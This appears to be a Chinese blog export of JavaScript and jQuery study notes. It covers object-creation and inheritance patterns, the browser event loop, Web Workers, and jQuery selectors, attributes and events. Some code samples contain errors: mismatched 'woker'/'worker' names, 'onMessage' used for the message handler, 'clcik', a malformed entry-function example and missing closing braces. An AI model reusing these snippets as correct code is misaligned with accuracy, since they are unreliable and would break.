特点：静态，作用域在编写代码时就确定了 闭包：一个函数可以访问另一个函数作用域中的变量，前者是闭包 作用：让子函数能访问到父函数中的变量 面向对象高级(重点内容)对象的创建模式Object构造函数模式 创建流程 先创建空的Object对象,再动态添加属性/方法 适用场景 起始时不确定对象内部数据 存在问题 语句太多 实现代码 123456789// 创建空Object对象var obj = new Object();var obj = &#123;&#125;;// 动态添加属性/方法obj.name = 'Tom';obj.age = 14;obj.setName = function(name)&#123; this.name = name&#125; 对象字面量模式 创建流程 使用{}创建对象,同时指定属性/方法 适用场景 起始时对象内部属性是确定的 存在问题 如果创建多个对象,代码冗余 实现代码 12345678// &#123;&#125;创建对象, 同时指定属性/方法var obj = &#123; name: 'Tom', age: 14, setName: function(name)&#123; this.name = name; &#125;&#125; 工厂模式 创建流程 通过工厂函数动态创建对象并返回 适用场景 需要创建多个对象 存在问题 对象没有具体的类型,都是Object类型 实现代码 1234567891011// 创建工厂函数function createPerson(name, age)&#123; var obj = &#123; name: name, age: age, setName: function(name)&#123; this.name = name &#125; &#125; return obj&#125; 自定义构造函数模式 创建流程 自定义构造函数,通过new创建对象 适用场景 需要创建多个类型确定的对象 存在问题 每个对象都有相同的数据,浪费内存 实现代码 12345678910111213// 创建自定义构造函数function Person(name, age)&#123; this.name = name; this.age = age; this.setName = function(name)&#123; this.name = name &#125;&#125;// new创建对象var p1 = new Person('Tom', 12);p1.setName('YF');var p2 = new Person('Bom', 14);p2.setName('YangFan'); 构造函数+原型的组合模式 创建流程 自定义构造函数,属性在函数中初始化,方法添加到原型中 适用场景 需要创建多个类型确定的对象 实现代码 123456789101112131415// 自定义构造函数function Person(name, age)&#123; this.name = name; this.age = age;&#125;// 方法添加到原型中Person.prototype.setName = function(name)&#123; this.name = name;&#125;// new 创建对象var p1 = new Person('Tom', 14);p1.setName('YF');var p2 = new Person('Bom', 12);p2.setName('YangFan'); 继承模式原型链继承 实现流程 定义父类型构造函数 给父类型的原型添加方法 定义子类型的构造函数 创建父类型的对象赋值给子类型的原型 将子类型的原型的构造属性设置为子类型 给子类型原型添加方法 创建子类型的对象: 可以调用父类型的方法 实现继承的关键 子类型的原型为父类的一个实例对象 实现代码12345678910111213141516171819202122232425// 定义父类型构造函数function Supper()&#123; this.supPro = "Supper property";&#125;// 给父类型的原型添加方法Supper.prototype.showSupPro = function()&#123; console.log(this.supPro);&#125;// 定义子类型的构造函数function Sub()&#123; this.subPro = "Sub property";&#125;// 创建父类型的对象赋值给子类型的原型Sub.prototype = new Supper();// 将子类型的原型的构造属性设置为子类型Sub.prototype.constructor = Sub;// 给子类型原型添加方法Sub.prototype.showSubPro = function()&#123; console.log(this.subPro);&#125;// 创建子类型对象var s1 =new Sub();// 调用父类型方法s1.showSupPro(); 借用构造函数继承(不是真正意义上的继承) 实现流程 定义父类型构造函数 定义子类型构造函数 在子类型中构造函数中调用父类型构造 实现继承的关键 在子类型构造函数中通过call()调用父类型构造函数 实现代码1234567891011121314// 定义弗雷西构造函数function Person(name, age)&#123; this.name = name; this.age = age;&#125;// 定义子类型构造函数function Student(name, age, price)&#123; // 在子类型中构造函数中调用父类型构造 Person.call(this, name, age); this.price = price;&#125;var s1 = new Student('Tom', 14, 1000);console.log(s1.name, s1.age, s1.price); 原型链+借用构造函数的组合继承 实现关键 利用原型链实现对父类型对象的方法的继承 利用call()借用父类型构建函数初始化相同属性 实现代码 1234567891011121314151617181920212223function Person(name, age)&#123; this.name =name; this.age = age;&#125;Person.prototype.setName = function(name)&#123; this.name = name;&#125;function Student(name, age, price)&#123; Person.call(this, name, age); this.price = price;&#125;Student.prototype = new Person(); // 这一步是为了让子类型能使用到父类型的方法Student.prototype.constructor = Student; // 这一步是为了修正constructor属性Student.prototype.setPrice = function(price)&#123; this.price = price;&#125;var s1 =new Student('Tom', 14, 10000);s1.setName('Bom');s1.setPrice(8000);console.log(s1); 知识点 new一个对象背后做了什么? 创建一个空对象 给对象设置proto,值为构造函数的prototype属性值 this.proto = Fn.prototype 执行构造函数体(给对象添加属性/方法) 线程机制与事件机制线程与进程 进程 每个程序必须有一个进程,占有一片独立的内存空间 可以通过windows任务管理查看进程 线程 进程内的一个地理执行单元 执行程序的一个完整流程 CPU的最小调度单元 进程与线程的关系 一个进程至少有一个线程(主) 程序是在某个进程中的某个线程执行的 浏览器内核模块组成 主线程 JS引擎模块 负责js程序的编译与运行 HTML/CSS文档解析模块 负责页面文本的解析 DOM/CSS模块 负责dom/css在内存中的相关处理 布局和渲染模块 负责页面的布局和效果的绘制(内存中的对象) 分线程 定时器模块 负责定时器的管理 DOM事件模块 负责事件的管理 网络请求模块 负责Ajax请求 JS线程 JS是单线程执行的(回调函数也是在主线程) H5提出了实现多线程的方案: Web Workers 只能是主线程更新界面 定时器问题 定时器并不真正完全定时 如果在主线程执行了一个长时间的操作,可能导致延时才处理 事件处理机制 代码分类 初始化执行代码 包含绑定DOM事件监听、设置定时器、发送Ajax请求的代码 回调执行代码 处理回调逻辑 JS引擎执行代码的基本流程 初始化代码 ==&gt; 回调代码 模型的两个重要组成部分 事件管理模块 回调队列 模型的运转流程 执行初始化代码,将事件回调函数交给对应模块管理 当事件发生时,管理模块会将回调函数及其数据添加到回调列队中 只有当初始化代码执行完后(可能要一定时间),才会遍历读取回调队列中的回调函数执行 H5 Web Workers 可以让js在分线程执行 Worker实现代码 1234567var woker = new Worker('worker.js');// 用来接收另一个线程发送过来的数据的回调worker.onMessage = function(event)&#123; event.data;&#125;// 向另一个线程发送数据worker.postMessage(data1); 问题 worker内代码不能操作DOM更新UI 不是每个浏览器都支持这个新特性 不能跨域加载JS 总结 一个进程至少有一个线程(主) 浏览器内核模块组成 主线程中有JS引擎模块、HTML/CSS文档解析模块、DOM/CSS模块、布局和渲染模块 分线程中有定时器模块、DOM事件模块、网络请求模块 JS是单线程执行的 定时器并不真正完全定时 在事件处理机制中代码分为初始化执行代码和回调执行代码 Workers是H5中的分线程执行功能，但是存在一些问题]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>javascript学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery学习笔记]]></title>
    <url>%2F2020%2F08%2F31%2FjQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[jQuery基础jQuery入口函数使用jQuery的三个步骤 引入jQuery文件 入口函数 功能实现 jQuery的入口函数12345678910111213141516171819// 第一种写法$(document).ready(function()&#123; // code&#125;)// 第二种写法jQuery(document).ready(function()&#123; // code&#125;)// 第三种写法 开发中推荐使用$(function)&#123; // code&#125;// 第四种写法jQuery(function()&#123; // code&#125;) 两种解决jQuery冲突问题 释放$的使用权 1jQuery.noConflict() 注意点：释放操作必须在编写其他jQuery代码之前编写，释放之后就不能再使用$,改为使用jQuery 自定义一个访问符号 1234var jq = jQuery.noConflict()jq(function()&#123; // code&#125;) jQuery核心函数 $(); 调用jQuery的核心函数 参数 接收一个字符串 接收一个字符串选择器 返回一个jQuery对象，对象中报错了找到的DOM元素 接收一个字符串代码片段 返回一个jQuery对象，对象中保存了创建的DOM元素 接收一个DOM元素 会被包装成一个jQuery对象返回给我们 什么是jQuery对象 jQuery对象是一个伪数组 伪数组有0到length-1的属性，并且有length属性 静态方法和实例方法 怎么给类添加一个静态方法？ 直接添加给类就是静态方法 123456789// 定义一个类function Person()&#123;&#125;// 添加静态方法Person.showName = function()&#123; alert("showName");&#125; 怎样调用静态方法？ 静态方法通过类名调用 1Person.showName(); 怎么给类添加实例方法？ 添加到类的原型当中 123Person.prototype.showAge = function()&#123; alert('showAge');&#125; 怎样调用实例方法？ 实例方法通过类的实例调用 12var p = new Person();p.showAge(); jQueryAPI遍历 原生遍历数组的方法 forEach() 第一个参数：遍历到的元素 第二个参数：当前遍历到的索引 注意点 原生forEach方法只能遍历数组，不能遍历伪数组123456// 定义数组var arr = [1, 3, 5, 7, 9];// 遍历数组arr.forEach(function(value, index)&#123; console.log(index, value); &#125;) map()方法 第一个参数：当前遍历到的元素 第二个参数：当前遍历到的索引 第三个参数：当前遍历的数组 注意点 和原生的forEach一样,不能遍历的伪数组 1234var arr = [1, 3, 5, 7, 9];arr.map(function(value, index, array)&#123; console.log(index, value, array);&#125;) jQuery遍历数组的方法 each() 第一个参数：当前遍历到的索引 第二个参数：遍历到的元素 注意点 jQuery的each方法是可以遍历伪数组的12345678910// 真数组var arr = [1, 3, 5, 7, 9];var obj = &#123;0:1, 1:3, 2:5, 3:7, 4:9, length:5&#125;;// 伪数组$.each(arr, function(index, value)&#123; console.log(index, value);$.each(obj, function(index, value)&#123; console.log(index, value);&#125;); map() 第一个参数：要遍历的数组 第二个参数：要遍历一个原生之后执行的回调函数 回调函数的参数： 第一个参数：要遍历到的元素 第二个参数：遍历到的索引 注意点 jQuery种each静态方法一样，map静态方法也可以遍历1234var arr = [1, 3, 5, 7, 9];var obj = &#123;0:1, 1:3, 2:5, 3:7, 4:9, length:5&#125;;$.map(arr, function(value, index)&#123; console.log(index, value); 区别 jQuery中的each静态方法和map静态方法的区别：each静态方法默认的返回值就是，遍历谁就返回谁map静态方法则是默认返回值是一个空数组 each静态方法不支持再回调函数中对遍历的数组进行处理map静态方法可以再回调函数中通过return对遍历的数组进行处理，然后生成一个新数组返回 其他方法 $.trim() 作用：去除字符串两端空格 参数：需要去除空格的字符串 返回值：去除空格之后的字符串 $.isWindow() 作用：判断传入的对象是否是window对象 返回值：true/false $.isArray(); 作用：判断传入的对象是否是真数组 返回值：true/false $.isFunction(); 作用：判断传入的对象是否是一个函数 返回值：true/false 注意点： jQuery框架本质上是一个函数 12(function( window, undefined ) &#123; &#125;)( window ); 选择器 jQuery内容选择器 12345&lt;div&gt;&lt;/div&gt;&lt;div&gt;我是div&lt;/div&gt;&lt;div&gt;我是div123我是div123&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt; :empty 作用：找到既没有文本内容也没有子元素的指定元素 1var $div = $('div:empty'); :parent 作用：找到文本内容或有子元素的指定元素 1var $div = $('div:parent'); :contains(text) 作用：找到包含指定文本内容的指定元素 1var $div = $('div:contains(div)'); :has(selector) 作用：找到包含指定子元素的指定元素 1var $div = $('div:has("span")'); 属性和属性节点 原生操作属性节点的方法 setAttribute() 作用：设置属性节点 DOM元素.setAttribute(&#39;属性名称&#39;, &#39;值&#39;); getAttribute() 作用：获取属性节点 DOM元素.getAttribute(&#39;属性名称&#39;); jQuery操作属性节点的方法 attr(name|pro|key, val|fn) 作用：获取或者设置属性节点的值 第二个参数可选 传递一个参数，代表获取属性节点值 传递两个参数，代表设置属性节点值 var res = $(&quot;.sp1&quot;).attr(&#39;name&#39;, &#39;span&#39;); removeAttr(name) 作用：删除属性节点 注意点 会删除所有找到元素指定的属性节点 $(&#39;.sp2&#39;).removeAttr(&#39;name class&#39;); prop() 作用和attr方法一致 12console.log($('input').attr('checked')); //选中返回 checked 未选中返回undefined removeProp() 作用和removeAttr一致 12console.log($('input').prop('checked')); // 选中返回 true 未选中返回false 注意点 prop方法不仅能够操作属性，还能操作属性节点 attr和prop既然作用一致，那开发中究竟用谁? 官方推荐在操作属性节点时,具有 true 和 false 两个属性的属性节点，如 checked, selected 或者 disabled 使用prop()，其他的使用 attr()操作类 jQuery操作类方法 addClass(class|fn) 作用：添加一个类；如果要添加多个，多个类名之间用空格隔开即可 $(&#39;div&#39;).addClass(&#39;class1 class2&#39;); removeClass([class]|fn[, sw]) 作用：删除一个类；如果想删除多个，多个类名之间用空格隔开即可 $(&#39;div&#39;).removeClass(&#39;class1 class2&#39;); toggleClass(class|fn[, sw]) 作用：切换类；有就删除，没有就添加 `$(&apos;div&apos;).toggleClass(&apos;class1 class2&apos;);`操作文本值 jQuery操作文本值 html 和原生JS中的innerHTML一样 $(&#39;div&#39;).html(&#39;&lt;p&gt;我是p标签&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;&#39;); text 和原生JS中的innerText一样 $(&#39;div&#39;).text(&#39;&lt;p&gt;我是p标签&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;&#39;) val 设置或获取输入框值 $(&#39;input&#39;).val(&#39;请输入内容&#39;); 操作CSS样式 jQuery设置css样式 css(name|pro|[, val|fn]) 123456789101112131415161718// 1. 逐个设置$('div').css('width', '100px');$('div').css('height', '100px');$('div').css('background', 'red');// 2. 链式设置// 注意点：链式操作如果大于3步，建议分开$('div').css('width', '100px').css('height', '100px').css('background', 'green');// 3. 批量设置$('div').css(&#123; width: '100px', height: '100px', background: 'blue'&#125;)// 4. 获取CSS样式值console.log($('div').css('background')); 操作位置和尺寸12345&lt;div class="father"&gt; &lt;div class="son"&gt;&lt;/div&gt; &lt;/div&gt; &lt;button&gt;获取&lt;/button&gt; &lt;button&gt;设置&lt;/button&gt; jQuery操作位置和尺寸的方法 width([val|fn]) 作用：获取元素宽度 console.log($(&#39;.father&#39;).width()); height([val|fn]) 作用：获取元素高度 console.log($(&#39;.father&#39;).height()); offset([coordinates]) 作用：获取元素距离窗口的偏移位 console.log($(&#39;.son&#39;).offset().left); position() 作用：获取元素距离定位 console.log($(&#39;.son&#39;).position().left); scrollTop([val]) 作用：获取和设置滚动偏移位 获取 console.log($(&#39;.scroll&#39;).scrollTop()); 设置 $(&#39;.scroll&#39;).scrollTop(300); scrollLeft([val]) 作用同上；设置方向不同 事件事件的绑定绑定事件的两个步骤 获取对象 绑定事件 两种绑定事件方式 Element.eventName(fn) 编码效率略高/部分事件jQuery没有事件，所以不能添加 123$('button').clcik(function()&#123; alert('hello event');&#125;); on(eventName, fn) 编码效率略低/所以js事件都可以添加 123$('button').on('click', function()&#123; alert('hello event');&#125;); 注意点 可以添加多个相同或者不同类型的事件，不会覆盖事件的移出 off([eventName]) 不传递参数，会移出所有的事件 $(&quot;button&quot;).off(); 传递一个参数，会移除所有指定类型的事件 $(&quot;button&quot;).off(&quot;click&quot;); 传递两个参数，会移除所有指定类型的指定事件 $(&quot;button&quot;).off(&quot;click&quot;, callBack); 事件冒泡和默行为 什么是事件冒泡? 是一种机制；父元素father和子元素son都绑定了click事件，子元素触发click事件后，也会触发father的click事件。 阻止事件冒泡 第一种方式 return false 第二种方式 event.stopPropagation() 什么是默认行为? 也是一种机制;a标签触发单击事件后默认会打开另一个窗口,这就是默认行为 阻止默认行为 第一种方式 return false 第二种方式 event.preventDefault() 事件自动触发 trigger() 如果利用trigger自动触发事件，会触发事件冒泡和默认行为 $(&quot;.father&quot;).trigger(&quot;click&quot;); triggerHandler() 如果利用triggerHandler自动触发事件，不会触发事件冒泡和默认行为 $(&quot;.son&quot;).triggerHandler(&quot;click&quot;); 自定义事件想要自定义事件，必须满足两个条件 事件必须是通过on绑定的 事件必须通过trigger和triggerHandler来触发 1234$(".son").on("myClick", function () &#123; alert("son"); &#125;); $(".son").triggerHandler("myClick"); 事件命名空间想要事件的命名空间有效，必须满足两个条件 事件是通过on来绑定的 通过trigger和triggerHandler触发事件 12345678$(".son").on("click.zs", function () &#123; alert("click1");&#125;);$(".son").on("click.ls", function () &#123; alert("click2");&#125;);// $(".son").trigger("click.zs");$(".son").triggerHandler("click.zs"); 注意点 利用trigger触发子元素带命名空间的事件, 那么父元素带相同命名空间的事件也会被触发. 而父元素没有命名空间的事件不会被触发 利用trigger触发子元素不带命名空间的事件,那么子元素所有相同类型的事件和父元素所有相同类型的事件都会被触发事件的委托 什么是事件委托? 请别人帮忙做事情，然后将做完的结果反馈给我们 delegate() 1234567$("button").click(function () &#123; $("ul").append("&lt;li&gt;我是新增的li&lt;/li&gt;"); &#125;);$("ul").delegate("li", "click", function () &#123; console.log($(this).html()); &#125;); 鼠标移入移出 mouseover/mouseout 子元素被移入移出也会触发父元素的事件 1234567$(".father").mouseover(function () &#123; console.log("father被移入了");&#125;);$(".father").mouseout(function () &#123; console.log("father被移出了");&#125;); mouseenter/mouseleave 子元素被移入移出不会触发父元素的事件 12345678$(".father").mouseenter(function () &#123; console.log("father被移入了");&#125;);$(".father").mouseleave(function () &#123; console.log("father被移出了");&#125;); hover 移入移出都会触发事件 12345$(".father").hover(function () &#123; console.log("father被移入了");&#125;,function () &#123; console.log("father被移出了");&#125;); jQuery原理Ajax]]></content>
      <categories>
        <category>Javascript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript基础笔记]]></title>
    <url>%2F2020%2F08%2F31%2FJavascript%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[javascript 高级、解释型语言 支持面向对象、命令式、函数式编程 开发商：Netscape(网景) 最初发行时间：1995 基础介绍 js输出语句 控制浏览器弹出一个警告框 alert(“内容”) 让计算机在页面中输出一个内容 document.write(&quot;内容&quot;)) 向body中输出一个内容 向控制台输出一个内容 console.log(&quot;内容&quot;) js外部引入方式 &lt;script type=&quot;text/javascript&quot; src=&quot;js/script.js&quot;&gt;&lt;/script&gt; 注意事项 script标签一旦用于引入外部文件，就不能在标签内编写代码 如果需要在标签内编写则需要重新创建一个script来编写 Unicode编码使用 在js中使用Unicode编码 \u四位编码 - console.log(&quot;\u2620&quot;) 在html页面中使用Unicode编码 &amp;#编码; 这里得编码需要得是十进制 - &lt;h1&gt;&amp;#9760;&lt;/h1&gt;基本语法 js注释 单行注释 // 多行注释 /* */ js注意事项 1. js中严格区分大小写 2. js中每一条语句以分号(;)结尾 - 如果不写分号，浏览器会自动添加，但会影响性能 3. js中会忽略多个空格和换行 声明变量 var a = 100; 标识符 - js中所有可以自主命名的都是标识符 - 例如：变量名、函数名、属性名 - 命名一个标识符需要遵守的规则 1. 标识符中可以含有字母、数字、_、$ 2. 标识符不能以数字开头 3. 标识符不能是ES中的关键字或保留字 4. 标识符一般都采用驼峰命名法 - 首字母小写，每个单词的开头字母大写，其余字母小写 - js底层保存标识符实际上是采用Unicode编码 - 所以理论上讲，所有的utf-8中含有的内容都可以作为标识符 数据类型(6种) typeof 检查变量的类型 语法: typeof 变量 String 字符串 - &apos;&apos; - &quot;&quot; 转义字符(\) \ 转义字符 \n 表示换行 \t 制表符 \\ 表示\ Number 数值 - 包括整数和浮点数(小数) js中表示数字的最大值 Number.MAX_VALUE js中表示数字的最小值 Number.MIN_VALUE Number表示的数字超过了最大值显示： Infinity 表示正无穷 -Infinity 表示负无穷 用typeof 检查 类型为 Number 注意事项： 1. NaN 是一个特殊的数字 2. 如果使用js进行浮点运算，可能得到一个不精确的结果 Boolean 布尔值 - true - false Null 空值 - 表示一个为空的对象 - 使用typeof 检查 会返回 object Undefined 未定义 - 当声明一个变量，但未赋值，值就为undefined Object 对象 - Object属于引用数据类型 强制类型转换 - 指将一个数据类型强制转换为其他的数据类型 - 类型转换主要指，将其他的数据类型，转换为 String NumBer Boolean 将其他数据类型转换为String 方式一： - 调用被转换数据类型的toString()方法 - 该方法不会影响到原变量，它会将转换的结果返回 - 注意：null和undefined这两个值没有toString()方法 如果条用他们的方法，会报错 方式二： - 调用String()函数，并将被转换的数据作为参数传递给函数 - 使用String()函数做强制类型转换时， 对于Number和Boolean实际上就是调用toString()方法 但是对于null和undefined,就不会调用toString()方法 它会将null 直接转换为 &quot;null&quot; 将undefined 直接转换为 &quot;undefined&quot; 将其他的数据类型转换为Number 方式一： 使用Number() 函数 - 字符串转数字 1. 如果是纯数字的字符串，则直接将其转换为数字 2. 如果字符串中有非数字的内容，则转换为NaN 3. 如果字符串是一个空串或者是一个全是空格的字符串，则转换为0 - 布尔转数字 true 转成 1 false 转成 0 - null 转 数字 0 - undefined 转 数字 NaN 方式二： - 这种方式专门用来针对字符串 - parseInt() 把一个字符串转换为一个整数 - parseFloat() 把一个字符串转换成一个浮点数 将其他数据类型转换为Boolean - 使用Boolean()函数 - 数字 转 布尔 除了0 和 NaN，其余的都是true - 字符串 转 布尔 除了空串，其余的都是true - null 和 undefined 都会转换为false - 对象也会转换为true 运算符 算术运算符 当对非Number类型的值进行运算时，会将这些值转换为Number然后再运算 任何值和NaN做运算都得NaN + - * / % 一元运算符 + - 自增自减运算符 ++ -- 逻辑运算符 ! &amp;&amp; || &amp;&amp; || 非布尔值的情况 - 对于非布尔值进行与或运算时， 会先将其转换为布尔值，然后再运算，并且返回原值 - 与运算： - 如果第一个值为true，则必然返回第二个值 - 如果第一个值为false，则直接返回第一个值 - 或运算 - 如果第一个值为true，则直接返回第一个值 - 如果第一个值为false，则返回第二个值 赋值运算符 = += -= *= /= %= 关系运算符 &gt; &gt;= &lt; &lt;= - 字符串比较 是比较字符的Unicode编码 相等运算符 ==(相等 会自动做类型转换) !=(不相等) ===(全等 不会自动做类型转换) !==(不全等) - undefined 衍生自 null 条件运算符/三元运算符 语法： 条件表达式?语句1:语句2; 执行的流程： 条件运算符再执行时，首先对条件表达式进行求值， 如果该值为true,则执行语句1，并返回结果 如果该值为false，则执行语句2，并返回结果 运算符的优先级 流程控制 语句的分类： 1. 条件判断语句 2. 条件分支语句 3. 循环语句 条件判断语句： 语法一： if(条件表达式){ 语句; } 语法二： if(条件表达式){ 语句..; }else{ 语句..; } 语法三： if(条件表达式){ 语句..; }else if(条件表达式){ 语句..; }else if(条件表达式){ 语句..; }else{ 语句..; } 条件分支语句： 语法： switch(条件表达式){ case 表达式: 语句..; case 表达式: 语句..; case 表达式: 语句..; default: 语句..; break; } 循环语句 while循环： 语法： while(条件表达式){ 语句..; } do...while循环： 语法： do{ 语句..; }while(条件表达式); for循环 语法: for(初始化表达式;条件表达式;更新表达式){ 语句..; }(重点内容)对象 对象属于一种复合的数据类型，在对象中可以保存多个不同数据类型的属性 对象的分类： 1. 内建对象 - 由ES标准中定义的对象，在任何的ES的实现中都可以使用 - 比如：Math String Number Boolean Function Object ... 2. 宿主对象 - 由js的运行环境提供的对象，目前来讲主要指由浏览器提供的对象 - 比如 BOM DOM 3. 自定义对象 - 由开发人员自己创建的对象 对象的基本操作 创建对象 使用new关键字调用的函数，是构造函数constructor 构造函数是专门用来创建对象的函数 语法： var 变量名 = new Object(); 添加对象属性 语法： 对象.属性名 = 属性值; 读取对象中的属性 语法： 对象.属性名; 修改对象的属性值 语法： 对象.属性名 = 新值; 删除对象的属性 语法： delete 对象.属性名; 属性名 和 属性值 属性名 如果要使用特殊的属性名，不能采用.的方式来操作 需要使用另一种方式： 语法： 对象[&apos;属性名&apos;] = 属性值 特点： 使用[]这种形式去操作属性，更加灵活 属性值 js对象的属性值，可以是任意的数据类型 - 甚至可以是对象 in 运算符 - 通过该运算符可以检查一个对象中是否含有指定的属性 如果有则返回true，没有则返回false - 语法： &quot;属性名&quot; in 对象 基本数据类型与引用数据类型 基本数据类型 String Number Boolean Null Undefined 引用数据类型 Object 基本数据类型与引用数据类型区别 js中的变量(基本数据类型)都是保存到栈内存中的 基本数据类型的值直接在栈内存中存储 值与值之间是独立存在，修改一个变量不会影响到其他的变量 对象则是保存到堆内存中 每创建一个新的对象，就会在堆内存中开辟出一个新的空间， 而变量保存的是对象的内存地址（对象的引用）,如果两个变量 保存的是同一个对象引用，当通过一个变量修改属性时，另一个也会受到影响 当比较两个基本类型的时候，就是比较值。 而比较两个引用数据类型时，他们比较的对象是内存地址， 如果两个对象是一模一样，但是地址不同，它也会返回false 对象字面量 使用对象字面量，可以在创建对象时，直接指定对象中的属性 语法： {属性名:属性值,属性名:属性值...} 对象字面量的属性名可以加引号也可以不加,建议不加 如果要使用一些特殊的名字，则必须加引号 函数 函数也是一个对象 函数的实参可以是任意类型的数据 函数返回值可以是任意的数据类型 创建函数 使用 函数声明 来创建一个函数 语法： function 函数名([形参1,形参2...形参N]){ 语句...; } 使用 函数表达式 来创建一个函数 也叫匿名函数 语法： var 函数名 = function([形参1,形参2...形参N]){ 语句...; } 调用函数 语法： 函数名(); 函数的方法 call()和apply() - 这两个方法都是函数对象的方法，需要通过函数对象来调用 - 当对函数调用call() 和 apply() 都会调用函数执行 - 在调用call() 和 apply() 可以将一个对象指定为第一个参数 此时这个对象将会成为函数执行时的this - call() 方法可以将实参对象之后依次传递 - apply() 方法需要将实参在对象之后依次传递 - this的情况： 1. 以函数形式调用时，this永远都是window 2. 以方法的形式调用时，this是调用方法的对象 3. 以构造函数的形式调用时，this是新创建的那个对象 4. 使用call和apply调用时，this是指定的那个对象 函数的参数(arguments) 在调用函数时，浏览器每次都会传递进两个隐含的参数： 1. 函数的上下文对象 this 2. 封装实参的对象 arguments - arguments 是一个类数组对象，它也可以通过索引来操作数据，也可以获取长度 - 在调用函数时，我们所传递的实参都会在arguments中保存 - arguments.length 可以用来获取实参的长度 - 即使不定义形参，也可以通过arguments来使用实参，只不过比较麻烦 arguments[0] 表示第一个实参 arguments[1] 表示第二个实参 ... - 属性 callee 作用：指向当前正在指向的函数的对象 立即执行函数 函数定义完，立即被调用，这种函数叫做立即执行函数 立即函数往往只会执行一次 语法： (function(a,b){ alert(a+b); })(100,100); 函数也可以成为对象的属性 如果一个函数作为一个对象的属性保存， 那么我们称这个函数为对象的方法 调用这个函数就为调用对象的方法(method) 但是它只是名称上区别并没有其他区别 枚举对象中的属性 使用for ... in 语句 语法： for(var 变量 in 对象){ } 变量的声明提前 - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值） 但是如果声明变量时不适用var关键字，则变量不会被声明提前 函数的声明提前 - 使用函数声明形式创建的函数 function 函数(){} 它会在所有代码执行之前就创建，所以我们可以在声明前调用 作用域 - 作用域指一个变量的作用的范围 - 在js中一共有两种作用域： 1. 全局作用域 - 直接编写在script标签中的js代码，都在全局作用域 - 全局作用域在页面打开时创建，在页面关闭时销毁 - 在全局作用域中有一个全局对象window， 它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用 - 在全局作用域中： 创建的变量都会作为window对象的属性保存 创建的函数都会作为window对象的方法保存 - 全局作用域中的变量都是全局变量 在页面的任意的部分都可以访问到 2. 函数作用域 - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁 - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的 - 在函数作用域中可以访问到全局作用域的变量 在全局作用域中无法访问到函数作用域的变量 - 当在函数作用域操作一个变量时，它会现在自身作用域中寻找，如果有就直接使用 如果没有则向上一级作用域中寻找，直到找到全局作用域， 如果全局作用域中依然没有找到，则会报错ReferenceError - 在函数中要访问全局变量可以使用window对象 解析器在调用函数每次都会向函数内部传递进一个隐含的参数， 这个隐含的参数就是this，this指向的是一个对象， 这个对象我们称为函数执行的 上下文对象， 根据函数的调用方式的不同，this会指向不同的对象 1. 以函数的形式调用时，this永远都是window 2. 以方法的形式调用时，this就是调用方法的那个对象 构造函数 构造函数其实就是普通函数，创建方式和普通方式没有区别， 不同的是构造函数习惯首字母大写 构造函数和普通函数的区别： 调用方式的不同 普通函数就是直接调用，而构造函数需要使用new关键字来调用 构造函数的执行流程 1. 立即创建一个新对象 2. 将新建的对象设置为函数中this，在构造函数中可以使用this来引用新建的对象 3. 逐行执行函数中的代码 4. 将新建的对象作为返回值返回 使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类。 我们将通过一个构造函数创建的对象，称为该类的实例 this的情况 1. 当以函数的形式调用时，this是windo 2. 当以方法的形式调用时，谁调用方法this就是谁 3. 当以构造函数的形式调用时，this就是新创建的那个对象 运算符 instanceof 作用：检查 一个对象 是否 是一个类的实例 语法： 对象 instamceof 对象 原型 prototype 原型是个对象，可以用来弥补 多次调用构造函数的方法 会产生多个不同内存但是相同的方法。 通过把共有的对象写入 到原型对象中，可以有效解决这个缺陷。 原型对象如何使用？ 语法： 对象名.prototype.属性名= 属性值; 对象名.prototype.方法名 = function(){ }; 我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype 这个属性对应着一个对象，这个对象就是我们所谓的原型对象 如果 函数作为普通函数调用prototype没有任何作用 当函数以构造函数的形式调用时，它所创建的对象中都会有一个隐含的属性， 指向该构造函数的原型对象，我们可以通过__proto__来访问该属性 原型对象就相当于一个公共的区域，所有同一个类的实例都可以访问到这个原型对象， 我们可以将对象中共有的内容，统一设置到原型对象中 当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果有直接使用， 如果没有则会去原型对象中寻找 以后我们创建构造函数时，可以将这些对象共有的属性和方法，统一添加到构造函数的原型对象中， 这样不用分别为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法了 使用in检查对象中是否含有某个属性时，如果对象中没有但是原型中有 会返回true 但是如果我们要检查 对象自身中是否含有该属性 则需要用对象的hasOwnProperty() 方法来检查 原型对象也是对象，所有它也有原型 当我们使用一个对象的属性或方法时，会先在自身中寻找， 自身中如果有，则直接使用， 如果没有则去原型对象中寻找，如果原型对象中有，则使用， 如果没有则去原型的原型中寻找 Object对象的原型没有原型，如果在Object原型中依然没有找到，则返回undefined 在页面中打印一个对象时，实际上是输出对象的toString()方法的返回值 垃圾回收（GC） - 程序运行过程中会产生垃圾，垃圾堆积过多，会导致程序变慢或内存溢出奔溃， 所有在程序运行中需要一个垃圾回收机制来处理程序垃圾 - 什么是程序垃圾？ 当一个对象没有任何的变量或属性对它进行引用，也永远无法操作该对象， 这个对象就是一个程序垃圾。 - 在js中拥有自动的垃圾回收机制，会自动将这些垃圾对象从内存中销毁， 我们不需要也不能进行垃圾回收的操作 - 我们需要做的只是要将不再使用的对象设置为null即可 数组(Arry) - 数组也是一个对象 - 它和我们普通对象功能类似，用来存储数据 - 数组中的元素可以是任意的数据类型 - 不同之处： 对象使用字符串作为属性名 数组使用数字作为索引操作元素 - 索引 从0开始的整数就是索引 - 